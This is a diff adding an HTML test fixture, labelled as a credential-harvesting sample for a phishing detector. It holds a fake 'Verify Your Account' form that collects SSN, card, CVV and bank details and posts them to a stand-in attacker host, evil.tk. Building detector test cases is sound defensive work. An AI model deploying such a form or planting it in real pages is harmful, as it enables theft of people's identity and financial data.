@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Verify Your Account</title>
+</head>
+<body>
+<!-- TEST FILE: Credential harvesting -->
+<!-- This should trigger: phishing detector PHISH-CRED-HARVEST -->
+
+<h1>Update Your Payment Information</h1>
+
+<form action="https://evil.tk/collect.php" method="POST">
+    <h3>Personal Information</h3>
+    <input type="text" name="fullname" placeholder="Full Name">
+    <input type="text" name="ssn" placeholder="Social Security Number">
+
+    <h3>Card Details</h3>
+    <input type="text" name="card_number" placeholder="Card Number">
+    <input type="text" name="expiry" placeholder="Expiry Date MM/YY">
+    <input type="text" name="cvv" placeholder="CVV">
+
+    <h3>Bank Account</h3>
+    <input type="text" name="routing" placeholder="Routing Number">
+    <input type="text" name="account" placeholder="Account Number">
+
+    <button type="submit">Verify Account</button>
+</form>
+
+</body>
+</html>
